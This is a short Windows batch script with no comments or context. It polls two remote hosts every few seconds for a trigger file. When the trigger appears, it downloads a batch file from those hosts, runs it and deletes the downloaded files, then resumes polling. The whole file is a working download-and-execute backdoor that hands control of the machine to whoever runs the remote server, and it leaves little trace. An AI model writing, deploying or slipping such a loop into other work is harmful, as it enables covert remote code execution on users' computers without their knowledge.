@echo off
:xbat
timeout /t 3
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://dos.xp3.biz/xbat/on.xbat', 'on.xbat')"
powershell -Command "Invoke-WebRequest http://bat1234.xp3.biz/xbat/on.xbat -OutFile on.xbat"
if exist on.xbat goto xbat.download
goto xbat
:xbat.download
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://dos.xp3.biz/xbat/bat.xbat', 'bat.bat')"
powershell -Command "Invoke-WebRequest http://dos.xp3.biz/xbat/bat.xbat -OutFile bat.bat"
if exist bat.bat goto xbat.start
goto xbat
:xbat.start
call bat.bat
del on.xbat
del bat.bat
goto xbat





